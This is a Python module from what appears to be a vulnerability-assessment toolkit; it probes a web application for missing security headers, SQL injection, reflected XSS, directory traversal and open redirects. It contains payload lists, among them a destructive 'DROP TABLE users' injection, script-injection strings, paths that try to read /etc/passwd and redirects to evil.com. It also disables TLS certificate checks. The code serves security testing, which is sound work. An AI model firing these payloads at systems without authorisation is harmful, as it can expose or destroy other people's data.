"""
Web Application Tester Module
Tests web applications for common OWASP Top 10 vulnerabilities:
- SQL Injection
- XSS (Cross-Site Scripting)
- Security Headers
- Directory Traversal
- Open Redirect
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
from modules.utils import log_result


# Payloads for testing
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "'; DROP TABLE users; --",
    "1' AND SLEEP(2) --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
]

TRAVERSAL_PATHS = [
    "/../../../etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/%2e%2e/%2e%2e/etc/passwd",
]

SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
]


class WebAppTester:
    def __init__(self, url: str, timeout: int = 5):
        self.url = url.rstrip("/")
        self.timeout = timeout
        self.findings = []
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

    def _get(self, url: str) -> tuple:
        """Perform a GET request. Returns (status_code, headers, body)."""
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "VAPT-Toolkit/1.0"})
            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as res:
                return res.status, dict(res.headers), res.read(4096).decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), ""
        except Exception:
            return None, {}, ""

    def _check_security_headers(self):
        """Check for missing HTTP security headers."""
        print("  [*] Checking security headers...")
        status, headers, _ = self._get(self.url)
        if status is None:
            print("  [!] Could not connect to target URL.")
            return

        headers_lower = {k.lower(): v for k, v in headers.items()}
        for header in SECURITY_HEADERS:
            if header.lower() not in headers_lower:
                finding = {
                    "type": "Missing Security Header",
                    "severity": "MEDIUM",
                    "detail": f"Header '{header}' is not set.",
                    "reference": "OWASP A05:2021 - Security Misconfiguration",
                    "remediation": f"Add '{header}' to your server response headers."
                }
                self.findings.append(finding)
                print(f"  🟡 [MEDIUM] Missing header: {header}")
                log_result(f"WEB MISSING HEADER: {header}")
            else:
                print(f"  ✅ [OK] Header present: {header}")

    def _check_sql_injection(self):
        """Test for SQL injection via URL parameters."""
        print("\n  [*] Testing for SQL Injection...")
        test_url = self.url + "/search?q="
        error_signatures = ["sql", "syntax", "mysql", "ora-", "postgresql", "odbc", "sqlite"]

        for payload in SQL_PAYLOADS:
            encoded = urllib.parse.quote(payload)
            target = test_url + encoded
            status, _, body = self._get(target)
            body_lower = body.lower()

            if any(sig in body_lower for sig in error_signatures):
                finding = {
                    "type": "SQL Injection (Error-Based)",
                    "severity": "CRITICAL",
                    "detail": f"Database error revealed with payload: {payload}",
                    "reference": "OWASP A03:2021 - Injection | CWE-89",
                    "remediation": "Use parameterized queries / prepared statements. Sanitize all inputs."
                }
                self.findings.append(finding)
                print(f"  🔴 [CRITICAL] Possible SQL Injection! Payload: {payload[:40]}")
                log_result(f"WEB SQL INJECTION: {payload}")
                break
        else:
            print("  ✅ [OK] No obvious SQL Injection detected in basic tests.")

    def _check_xss(self):
        """Test for reflected XSS."""
        print("\n  [*] Testing for Cross-Site Scripting (XSS)...")
        test_url = self.url + "/search?q="

        for payload in XSS_PAYLOADS:
            encoded = urllib.parse.quote(payload)
            target = test_url + encoded
            _, _, body = self._get(target)

            if payload in body:
                finding = {
                    "type": "Reflected XSS",
                    "severity": "HIGH",
                    "detail": f"Payload reflected unescaped: {payload}",
                    "reference": "OWASP A03:2021 - Injection | CWE-79",
                    "remediation": "Encode all user-controlled output. Implement a strict CSP."
                }
                self.findings.append(finding)
                print(f"  🟠 [HIGH] Reflected XSS detected! Payload: {payload[:40]}")
                log_result(f"WEB XSS: {payload}")
                break
        else:
            print("  ✅ [OK] No obvious reflected XSS detected in basic tests.")

    def _check_directory_traversal(self):
        """Test for path traversal vulnerabilities."""
        print("\n  [*] Testing for Directory Traversal...")
        for path in TRAVERSAL_PATHS:
            target = self.url + path
            _, _, body = self._get(target)

            if "root:" in body or "/bin/bash" in body:
                finding = {
                    "type": "Directory Traversal",
                    "severity": "CRITICAL",
                    "detail": f"Server returned /etc/passwd content via: {path}",
                    "reference": "OWASP A01:2021 - Broken Access Control | CWE-22",
                    "remediation": "Validate and sanitize file path inputs. Use allow-lists for accessible directories."
                }
                self.findings.append(finding)
                print(f"  🔴 [CRITICAL] Directory Traversal confirmed! Path: {path}")
                log_result(f"WEB PATH TRAVERSAL: {path}")
                return

        print("  ✅ [OK] No directory traversal detected in basic tests.")

    def _check_open_redirect(self):
        """Test for open redirect vulnerability."""
        print("\n  [*] Testing for Open Redirect...")
        test_urls = [
            self.url + "/redirect?url=https://evil.com",
            self.url + "/?next=//evil.com",
            self.url + "/login?redirect=https://evil.com",
        ]
        for target in test_urls:
            status, headers, _ = self._get(target)
            location = headers.get("Location", "")
            if "evil.com" in location:
                finding = {
                    "type": "Open Redirect",
                    "severity": "MEDIUM",
                    "detail": f"Redirect to external URL confirmed: {location}",
                    "reference": "OWASP A01:2021 - Broken Access Control | CWE-601",
                    "remediation": "Validate redirect URLs against an allow-list of trusted domains."
                }
                self.findings.append(finding)
                print(f"  🟡 [MEDIUM] Open Redirect confirmed: {target}")
                log_result(f"WEB OPEN REDIRECT: {location}")
                return

        print("  ✅ [OK] No open redirect detected in basic tests.")

    def run(self) -> list:
        print(f"[*] Starting web application tests against: {self.url}\n")
        self._check_security_headers()
        self._check_sql_injection()
        self._check_xss()
        self._check_directory_traversal()
        self._check_open_redirect()

        print(f"\n[✔] Web testing complete. Found {len(self.findings)} issue(s).")
        return self.findings
